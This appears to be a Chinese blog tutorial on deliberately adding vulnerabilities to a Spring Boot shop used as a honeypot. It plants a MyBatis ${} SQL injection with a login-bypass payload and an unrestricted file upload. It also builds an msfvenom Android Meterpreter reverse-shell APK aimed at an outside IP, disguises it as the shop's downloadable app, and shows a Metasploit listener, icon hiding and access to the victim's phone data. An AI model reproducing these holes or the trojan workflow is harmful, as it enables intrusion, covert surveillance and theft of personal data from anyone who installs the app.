

# 在Springboot中添加漏洞和app木马

## 添加sql注入

首先介绍下${}和#{}的区别

#
1.#是预编译处理(是什么)
2.mybatis在处理#的时候,会将sql中的#{}替换为?号,调用预编译语句(PreparedStatement)中的set注入参数(这也是为什么变成问号的原因)
3.会在sql中加上' '单引号,所以会相对安全,不会有sql注入问题
4.支持基本数据类型(八大数据类型,包装类,BigDecimal等等)
$
1.$是字符串替换(是什么)
2.mybatis在处理$的时候,会将$的变量,原原本本的赋值到sql里面
3.直接作为SQL本身,不会加单引号,所以有sql注入问题

添加sql注入，用${}

![image-20210705152642037](https://tva1.sinaimg.cn/large/008i3skNly1gs63sot1h0j31ie0h8gp1.jpg)

这样我们在输入账号密码的时候就可以sql注入了，账户名用的'admin',密码输入的'1' or 1=1 -'' 

![image-20210706141741696](https://tva1.sinaimg.cn/large/008i3skNly1gs77f9gvktj32a20iw787.jpg)

成功登陆

![image-20210706141904510](https://tva1.sinaimg.cn/large/008i3skNly1gs77gmoa3fj32ai0u0adk.jpg)

## 文件上传漏洞

在上传商品的图片页面加入文件上传漏洞

![image-20210707151411500](https://tva1.sinaimg.cn/large/008i3skNly1gs8eob8v9hj31e10u0wi2.jpg)

```java
public String addGoods(Goods goods, HttpServletRequest request, String act) throws IllegalStateException, IOException {
		MultipartFile myfile = goods.getFileName();
		//如果选择了上传文件，将文件上传到指定的目录images
		if(!myfile.isEmpty()) {
			String path = "/honeypot";
			String fileName = myfile.getOriginalFilename();
			//对文件重命名
			String fileNewName = MyUtil.getNewFileName(fileName);
			File filePath = new File(path + File.separator + fileNewName);
			//如果文件目录不存在，创建目录
			if(!filePath.getParentFile().exists()) {
				filePath.getParentFile().mkdirs();
			}
			//将上传文件保存到一个目标文件中
			myfile.transferTo(filePath);
			System.out.println(filePath);
			//将重命名后的图片名存到goods对象中，添加时使用
			goods.setGpicture(fileNewName);
		}
		if("add".equals(act)) {
			int n = goodsRepository.addGoods(goods);
			if(n > 0)//成功
				return "redirect:/goods/selectAllGoodsByPage?currentPage=1&act=select";
			//失败
			return "admin/addGoods";
		}else {//修改
			int n = goodsRepository.updateGoods(goods);
			if(n > 0)//成功
				return "redirect:/goods/selectAllGoodsByPage?currentPage=1&act=updateSelect";
			//失败
			return "admin/UpdateAGoods";
		}
	}
```

因为文件上传漏洞的风险非常大，会直接把我的服务器干掉，所以最后得留一手，那就是将攻击者上传的文件放到一个隐藏目录下，这样它即使上传成功，功能再强大，也是没有用的，相当于我们在前端页面欺骗了他上传的路径，我们真正上传到的目录是服务器中的/honeypot/files文件夹，当攻击者上传后会骗他上传的路径是images下的，images下的这个上传的apk是不存在的

![image-20210707151936809](https://tva1.sinaimg.cn/large/008i3skNly1gs8etxq6zhj31c80e6dia.jpg)

然后我们去/honeypot/files中就可以逆向分析他的木马文件了，拿一个metasploit生成的apk木马举例

![image-20210707152402843](https://tva1.sinaimg.cn/large/008i3skNly1gs8eyk8hm1j31c00u0160.jpg)

## 添加APP木马

通过metasploit生成apk木马文件

`msfvenom -p android/meterpreter/reverse_tcp lhost=111.230.196.27 lport=10013 R > ./鹰讯.apk`

![image-20210707154516613](https://tva1.sinaimg.cn/large/008i3skNly1gs8fkmjzqjj319i0e2gpj.jpg)

开启隧道

![image-20210707154554287](https://tva1.sinaimg.cn/large/008i3skNly1gs8flaai0uj319a0f8425.jpg)

将apk木马上传到蜜罐上

添加下载apk功能

 将apk文件放置在resources/static文件夹下的apk包中

![img](https://tva1.sinaimg.cn/large/008i3skNly1gs9hqkw9ydj318k0ag75x.jpg) 

 

在前端页面添加下载App超连接标签，添加相对路径的下载地址和Download属性，实现在前端点击相应的超链接即可下载商城的apk文件

![img](https://tva1.sinaimg.cn/large/008i3skNly1gs9hqlto4dj31a80480we.jpg) 

 

下载App功能添加展示：

![img](https://tva1.sinaimg.cn/large/008i3skNly1gs9hqmawhyj31a803cmxp.jpg) 

功能实现：

![img](https://tva1.sinaimg.cn/large/008i3skNly1gs9hqn9m61j30p8098tak.jpg) 

 

## 演示反攻

show payloads可以看到所有能利用的payloads

![image-20210707154924605](https://tva1.sinaimg.cn/large/008i3skNly1gs8foxmc0dj31c00u04c5.jpg)

然后我们选择android/meterpreter/reverse_tcp（用于执行安卓指令的木马payload）

`set payload android/meterpreter/reverse_tcp`

设置监听端口

`set lhost 127.0.0.1`

`set lport 654`

然后exploit等待攻击者上钩

![image-20210707155211302](https://tva1.sinaimg.cn/large/008i3skNly1gs8fru5o0fj31qh0u0tf3.jpg)

模拟器打开apk后已经连上

![image-20210707160704456](https://tva1.sinaimg.cn/large/008i3skNly1gs8g7b3ec8j31s80dutbj.jpg)

`sysinfo`可以看到输出了攻击者的手机信息

![image-20210707161310056](https://tva1.sinaimg.cn/large/008i3skNly1gs8gdnglsrj30yq07oq3z.jpg)

对方在手机上能看到安装的app

![image-20210707160914815](https://tva1.sinaimg.cn/large/008i3skNly1gs8g9mekutj31ds0qi1kx.jpg)

我们为了更隐蔽，使用命令`hide_app_icon`隐藏app

![image-20210707161241755](https://tva1.sinaimg.cn/large/008i3skNly1gs8gd627yej61cc0qw1kx02.jpg)

我们还可以ps查看当前运行的进程

![image-20210707161348938](https://tva1.sinaimg.cn/large/008i3skNly1gs8geca8hvj31c00u048h.jpg)

![image-20210707161414978](https://tva1.sinaimg.cn/large/008i3skNly1gs8ges4thbj31c00u0wsg.jpg)

之后还可以获取攻击者的通讯录，短信、摄像头等

